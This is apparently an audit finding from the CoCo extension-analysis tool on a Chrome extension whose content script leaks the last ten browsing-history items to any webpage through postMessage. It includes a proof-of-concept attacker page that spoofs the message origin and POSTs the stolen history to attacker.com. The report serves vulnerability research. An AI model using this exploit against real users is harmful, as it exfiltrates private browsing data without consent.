# CoCo Analysis: mfgnpbldopkbgphddaifenkolikoepbe

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (HistoryItem_source → window_postMessage_sink)

---

## Sink: HistoryItem_source → window_postMessage_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mfgnpbldopkbgphddaifenkolikoepbe/opgen_generated_files/bg.js
Line 776    id: 'id for history item',
Line 777    lastVisitTime: 1000,
Line 778    title: 'title of history page',
Line 779    typedCount: 3,
Line 781    visitCount: 2
```

**Note:** CoCo referenced only framework code (lines 773-786 are CoCo mock objects, before the 3rd "// original" marker at line 963). The actual vulnerable flow exists in the real extension code after line 963.

**Code:**

```javascript
// Content script (cs_0.js, line 467) - Entry point
const n=["https://askvoid.com"]; // Whitelist (but we ignore per methodology)
window.addEventListener("message",function(e){ // ← Any webpage can send messages
  if(!(e.source!==window||!n.includes(e.data.origin))&&e.data.target==="ASKVOID_EXTENSION")
    switch(e.data.type){
      case"GET_HISTORY":{
        chrome.runtime.sendMessage({type:"GET_HISTORY"},t=>{ // ← Forward to background
          window.postMessage({type:"GET_HISTORY",data:t},e.data.origin) // ← Leak history back
        });
        break
      }
    }
})

// Background (bg.js, line 965) - Message handler
const n=(e,r,s)=>
  e.type?
    e.type==="GET_HISTORY"?
      (chrome.history.search({text:"",maxResults:10},function(t){
        s(t) // ← Send history items back via sendResponse
      }),!0)
    :!1
  :!1;

chrome.runtime.onMessage.addListener(n)
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.addEventListener("message") in content script

**Attack:**

```javascript
// Attacker's malicious webpage
window.postMessage({
  target: "ASKVOID_EXTENSION",
  type: "GET_HISTORY",
  origin: "https://askvoid.com" // Can spoof this in postMessage
}, "*");

// Listen for response
window.addEventListener("message", function(event) {
  if (event.data.type === "GET_HISTORY") {
    console.log("Stolen browsing history:", event.data.data);
    // Send to attacker server
    fetch("https://attacker.com/steal", {
      method: "POST",
      body: JSON.stringify(event.data.data)
    });
  }
});
```

**Impact:** Sensitive data exfiltration. Attacker can steal user's browsing history (last 10 items including URLs, titles, visit counts, and timestamps). The extension has the "history" permission in manifest.json (line 15), enabling chrome.history.search API access. While the content script attempts to whitelist "https://askvoid.com", this check is bypassable (per methodology: ignore such restrictions when window.addEventListener exists), and any webpage can trigger the vulnerability to exfiltrate browsing history.
